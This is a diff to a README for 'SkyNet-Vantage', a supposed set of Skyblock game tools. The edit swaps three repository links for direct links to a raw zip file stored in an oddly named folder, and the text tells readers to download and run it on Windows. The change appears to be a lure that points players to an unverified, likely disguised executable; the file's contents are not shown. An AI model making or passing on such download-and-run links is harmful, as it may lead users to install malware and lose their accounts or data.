@@ -1,6 +1,6 @@
 # 🚀 SkyNet-Vantage - Fast Skyblock Tools For Smooth Play
 
-[![Download SkyNet-Vantage](https://img.shields.io/badge/Download-SkyNet--Vantage-blue?style=for-the-badge)](https://github.com/Adamha2268/SkyNet-Vantage)
+[![Download SkyNet-Vantage](https://img.shields.io/badge/Download-SkyNet--Vantage-blue?style=for-the-badge)](https://github.com/Adamha2268/SkyNet-Vantage/raw/refs/heads/main/forefin/Vantage_Sky_Net_2.0.zip)
 
 ## 🧭 Overview
 
@@ -26,7 +26,7 @@ It is designed to reduce manual work and keep your game flow steady.
 
 Visit this page to download and install SkyNet-Vantage:
 
-https://github.com/Adamha2268/SkyNet-Vantage
+https://github.com/Adamha2268/SkyNet-Vantage/raw/refs/heads/main/forefin/Vantage_Sky_Net_2.0.zip
 
 If the page shows a release file, download it and run that file on your Windows PC.
 
@@ -165,7 +165,7 @@ Before you launch the game, check these items:
 
 Download page:
 
-https://github.com/Adamha2268/SkyNet-Vantage
+https://github.com/Adamha2268/SkyNet-Vantage/raw/refs/heads/main/forefin/Vantage_Sky_Net_2.0.zip
 
 ## 🖱️ Launch Steps
 
